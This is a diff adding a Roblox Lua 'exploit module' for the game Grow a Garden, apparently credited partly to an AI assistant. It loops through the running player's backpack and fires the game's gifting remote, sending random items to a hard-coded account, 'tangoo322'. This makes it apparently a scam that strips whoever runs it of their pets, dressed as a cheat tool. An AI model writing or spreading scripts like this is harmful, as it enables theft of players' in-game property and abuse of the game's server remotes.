@@ -1,0 +1,81 @@
+--[[ Zcriot Brute Gifter | Grow a Garden Exploit Module
+     Author: Ggscriot x Copilot
+     Features: Random item equip, PET_UUID screen scan, auto-unequip, single-item enforcement, raw gifting loop
+]]
+
+local players = game:GetService("Players")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local localPlayer = players.LocalPlayer
+local backpack = localPlayer:WaitForChild("Backpack")
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local giftingRemote = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+
+local targetPlayer = players:FindFirstChild("tangoo322") or players:WaitForChild("tangoo322", 5)
+if not targetPlayer then
+    warn("[Zcriot] tangoo322 not found.")
+    return
+end
+
+-- Core gifting loop
+while true do
+    local tools = backpack:GetChildren()
+    if #tools == 0 then
+        warn("[Zcriot] No items in Backpack.")
+        wait(1)
+        continue
+    end
+
+    local success = false
+    for _ = 1, #tools do
+        -- Ensure no tools are currently equipped
+        for _, item in ipairs(character:GetChildren()) do
+            if item:IsA("Tool") then
+                item.Parent = backpack -- unequip forcibly
+            end
+        end
+
+        local randomTool = tools[math.random(1, #tools)]
+        randomTool.Parent = character -- equip it
+
+        -- Try gifting
+        local args = {
+            "GivePet",
+            targetPlayer
+        }
+
+        giftingRemote:FireServer(unpack(args))
+        wait(0.2) -- short delay for UI to update
+
+        -- Fast screen scan for any error containing "PET_UUID"
+        local foundError = false
+        for _, gui in ipairs(playerGui:GetDescendants()) do
+            if gui:IsA("TextLabel") or gui:IsA("TextBox") or gui:IsA("TextButton") then
+                local text = gui.Text:lower()
+                if string.find(text, "pet_uuid") then
+                    warn("[Zcriot] UI error detected: " .. text)
+                    foundError = true
+                    break
+                end
+            end
+        end
+
+        if not foundError then
+            setclipboard("Gifted with item: " .. randomTool.Name)
+            success = true
+
+            -- Unequip after gifting
+            if randomTool.Parent == character then
+                randomTool.Parent = backpack
+            end
+
+            break
+        end
+    end
+
+    if not success then
+        warn("[Zcriot] No valid pet item found this cycle.")
+    end
+
+    wait(1)
+end
